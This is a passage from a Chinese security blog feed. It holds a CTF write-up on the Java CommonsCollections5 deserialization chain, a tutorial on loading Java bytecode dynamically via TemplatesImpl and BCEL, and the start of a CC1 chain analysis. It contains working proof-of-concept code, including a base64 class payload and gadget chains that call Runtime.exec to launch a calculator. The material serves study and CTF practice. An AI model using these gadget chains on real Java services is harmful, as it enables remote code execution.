class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lcdm123;<br><br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException </span>&#123;<br>        ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();<br>        Class clazz1 = Class.forName(<span class="hljs-string">&quot;com.ezgame.ctf.tools.ToStringBean&quot;</span>);<br>        Field ClassByte = clazz1.getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        ClassByte.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHgoABwAQBwARCAASCgATABQKABMAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENv&quot;</span> +<br>                <span class="hljs-string">&quot;ZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAKU291cmNlRmlsZQEADFVSTFRl&quot;</span> +<br>                <span class="hljs-string">&quot;c3QuamF2YQwACAAJAQAQamF2YS9sYW5nL1N0cmluZwEAEGdub21lLWNhbGN1bGF0b3IHABkMABoA&quot;</span> +<br>                <span class="hljs-string">&quot;GwwAHAAdAQAHVVJMVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9u&quot;</span> +<br>                <span class="hljs-string">&quot;AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAEAAQAIAAkAAgAKAAAAOwAEAAIAAAAXKrcAAQS9AAJZAxIDU0y4AAQrtgAFV7EAAAABAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAASAAQAAAAEAAQABQAOAAYAFgAHAAwAAAAEAAEADQABAA4AAAACAA8=&quot;</span>);<br>        ClassByte.set(toStringBean,bytes);<br><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        Class clazz2 = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz2.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(expException, toStringBean);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objOutputStream.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>        objOutputStream.writeInt(<span class="hljs-number">2021</span>);<br>        objOutputStream.writeObject(expException);<br>        objOutputStream.close();<br>        Base64.Encoder encoder = Base64.getEncoder();<br>        String result = encoder.encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109235709887.png" alt="image-20211109235709887"></p><p>成功弹出计算机</p><blockquote><p>注意使用URL编码一下</p></blockquote><p>在没有回显的情况下可以使用 <code>DNSlog</code> 测试一下（学校晚上断网所以只好在本地弹计算机玩玩了）</p><p>需要注意的点：</p><ul><li>POC这里需要保持类的路径一样</li></ul><p><del>这里复现失败了不知道是什么原因，POC的思路和我的是一样的</del> 太粗心了</p><p>这个题目现在看来确实简单，当时没有学习所以硬是没有看出来，确实是太菜了呀，已经又在反省了。</p><p>参考文章</p><p><a href="https://su18.org/post/ysoserial-su18-2/">https://su18.org/post/ysoserial-su18-2/</a></p><p><a href="https://y4er.com/post/ysoserial-commonscollections-5/">https://y4er.com/post/ysoserial-commonscollections-5/</a></p><p><a href="https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/">https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/</a></p><p><a href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://ego00.blog.csdn.net/article/details/119734674">https://ego00.blog.csdn.net/article/details/119734674</a></p><p><a href="https://ego00.blog.csdn.net/article/details/121072948">https://ego00.blog.csdn.net/article/details/121072948</a></p><p><a href="https://ctf.njupt.edu.cn/724.html">https://ctf.njupt.edu.cn/724.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-CC5&quot;&gt;&lt;a href=&quot;#Java-CC5&quot; class=&quot;headerlink&quot; title=&quot;Java CC5&quot;&gt;&lt;/a&gt;Java CC5&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java动态加载字节码</title>
    <link href="http://example.com/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <id>http://example.com/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</id>
    <published>2021-11-10T00:26:31.000Z</published>
    <updated>2021-11-10T00:50:54.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-动态加载字节码"><a href="#Java-动态加载字节码" class="headerlink" title="Java 动态加载字节码"></a>Java 动态加载字节码</h1><p>严格的说，java 字节码其实仅仅指的是 java 虚拟机执行使用的一类指令，通常存储在 class 文件中。这里的字节码可以理解为所有能够恢复成一类并且在JVM虚拟机里面加载的字节序列。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>ClassLoader</code>就是一个加载器，告诉JVM如何加载这个类，java默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类的完整路径，比如<code>java.lang.Runtime</code></p><p>正常情况下，java 会根据配置项<code>sun.boot.class.path</code> 和 <code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找 .class 文件来加载，这个基础路径分为三种情况：</p><ol><li><p>URL未以<code>/</code> 结尾，则认为是一个 jar 文件，使用<code>JarLoader</code>来寻找类，即为在jar包中寻找 .class 文件</p></li><li><p>URL以<code>/</code>结尾，且协议名为<code>file</code>则使用<code>FileLoader</code>来寻找类，即为在本地文件系统中寻找 .class 文件</p></li><li><p>URL以<code>/</code>结尾，且协议名不是<code>file</code>，则使用最基础的<code>Loader</code>来寻找类</p><blockquote><p>正常情况下是使用的前两类，第三种情况中最常见的协议就是<code>http</code></p></blockquote></li></ol><p>利用<code>URLClassLoader</code>加载远程 .class 文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109003101520.png" alt="image-20211109003101520"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109002927864.png" alt="image-20211109002927864"></p><p>成功加载了服务器上的函数代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109003256333.png" alt="image-20211109003256333"></p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>不管是加载远程 class 文件，还是本地的 class 文件或 jar文件， 都会经历下面三个方法调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109112249145.png" alt="image-20211109112249145"></p><ul><li><code>loadClass</code> 的作用是从已经加载的类缓存，父加载器等位置寻找类（双亲委派机制），在没有找到的情况下执行<code>findClass</code></li><li><code>findClass</code> 的作用就是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统，jar包或者远程http服务器上读取字节码然后交给<code>defineClass</code></li><li><code>defineClass</code>的作用就是处理前面传入的字节码，将其处理成真正的类</li></ul><p>所以核心部分就是<code>defineClass</code> 它决定了如何将字节码转换为 java 类，java 默认的<code>ClassLoader#defineClass</code>是一个 native 方法，逻辑主要在 JVM 的C语言代码中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109010604955.png"></p><p>由于 <code>ClassLoader#defineClass</code>方法是 protected 所以无法直接调用需要使用反射的方式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109010548813.png" alt="image-20211109010548813"></p><p><img src="D:\markdown\image-20211109120744346.png" alt="image-20211109120744346"></p><p>在实际情况中<code>defineClass</code>的方法作用域是不开放的，所以很少直接利用它进行工具，但是在<code>TemplatesImpl</code>中经常利用到它</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>在<code>TemplatesImpl</code>中定义了一个内部类<code>TransletClassLoader</code>，在这个类中重写了<code>defineClass()</code>,</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109122411306.png" alt="image-20211109122411306"></p><p>反过来追踪一下调用链</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123220585.png" alt="image-20211109123220585"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123310590.png" alt="image-20211109123310590"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123332228.png" alt="image-20211109123332228"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123353576.png" alt="image-20211109123353576"></p><p>最后追踪到的地方就是 <code>newTransformer()</code> 和 <code>getOutputProperties()</code> 它们的作用域都是 public 可以被外部调用。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>  -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>这里利用<code>newTransformer()</code>来构造POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLUse</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, MalformedURLException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException, TransformerConfigurationException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = base64decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABZUZW1wbGF0ZXNJbXBsVGVzdC5qYXZhDAAOAA8HABsMABwAHQEADUhlbGxvIGxjZG0xMjMHAB4MAB8AIAEAHW9yZy9sY2RtMTIzL1RlbXBsYXRlc0ltcGxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAAVAAQAFgAMABcAAQAQAAAAAgAR&quot;</span>);<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] base64decode(String encode)&#123;<br>        Base64.Decoder decoder = Base64.getDecoder();<br>        <span class="hljs-keyword">return</span> decoder.decode(encode);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setFieldValue()</code>利用反射的方法将私有属性反射出来让我们可以利用，这里利用了三个变量<code>_bytecodes</code> <code>_name</code> <code>_tfactory</code>。 <code>_bytecodes</code>是由字节码组成的数组；<code>_name</code>是任意字符串，<code>_tfactory</code> 需要一个<code>TransformerFactoryImpl</code>对象，因为<code>TemplatesImpl#defineTransletClasses() </code>方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。<a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p><p>并且<code>TemplatesImpl</code>中对加载的字节码有一定的要求，这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImplTest</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello lcdm123&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译为class文件然后用base64编码的方法获取文件内容，提供给类加载</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109132314399.png" alt="image-20211109132314399"></p><p>在很多的 java 反序列化链中都出现过<code>TemplatesImpl</code>类</p><h2 id="BCEL-ClassLoader-加载字节码"><a href="#BCEL-ClassLoader-加载字节码" class="headerlink" title="BCEL ClassLoader 加载字节码"></a>BCEL ClassLoader 加载字节码</h2><p>BCEL的全名Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被Apache Xalan 所使用，而 Apache Xalan 又是 java 内部对于 JAXP 的实现，所以BCEL也被包含在了 JDK 的原生库中。</p><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109144412406.png" alt="image-20211109144412406"></p><blockquote><p>需要在 BCEL字节码的前面加上 $$BCEL$$ 这样才会将他将它判断为BCEL字节码才会执行BCEL加载字节码</p></blockquote><p>参考文章</p><p>P神代码审计</p><p><a href="https://ego00.blog.csdn.net/article/details/119763746">https://ego00.blog.csdn.net/article/details/119763746</a></p><p><a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/">https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/119082164">https://y4tacker.blog.csdn.net/article/details/119082164</a></p><p><a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-动态加载字节码&quot;&gt;&lt;a href=&quot;#Java-动态加载字节码&quot; class=&quot;headerlink&quot; title=&quot;Java 动态加载字节码&quot;&gt;&lt;/a&gt;Java 动态加载字节码&lt;/h1&gt;&lt;p&gt;严格的说，java 字节码其实仅仅指的是 java 虚拟机执</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC链1</title>
    <link href="http://example.com/2021/11/08/Java-CC1/"/>
    <id>http://example.com/2021/11/08/Java-CC1/</id>
    <published>2021-11-08T13:34:32.000Z</published>
    <updated>2021-11-25T08:25:28.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>ubuntu + java7 + IDEA</p><h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><p>利用 maven 构造环境，以下代码是参考 P神代码审计中的样例，先测试以下效果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行后成功打开计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105164317083.png" alt="image-20211105164317083"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>一个接口，定义了一个<code>transform()</code>方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105191330954.png" alt="image-20211105191330954"></p><p><code>ConstantTransformer</code> <code>InvokerTransformer</code> <code>ChainedTransformer</code> 都实现了这个接口</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105190935528.png" alt="image-20211105190935528"></p><p>测试一下这个类的作用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105203849930.png" alt="image-20211105203849930"></p><p>传入的参数是一个 <code>Map</code>对象和两个实现了<code>Transformer</code>接口类的对象，返回值是一个<code>Map</code>类型的对象。它的作用就是来修饰 <code>Map</code>的，当被修饰的<code>Map</code>被添加新元素时将可以执行一个回调。上面的代码就是对<code>hashmap</code> 进行修饰，返回的<code>map</code>就是修饰后的<code>Map</code>，其中 <code>KeyTransformer</code> 是处理新元素的<code>key</code>的回调,<code>valueTransformer</code>是处理新元素的<code>value</code>的回调。        </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210022366.png" alt="image-20211105210022366"></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105210904067.png" alt="image-20211105210904067"></p><p>这个类的代码很少，该类的<code>transform()</code> 方法就是返回构造时的参数。        </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105212302747.png" alt="image-20211105212302747"></p><p>它的作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" 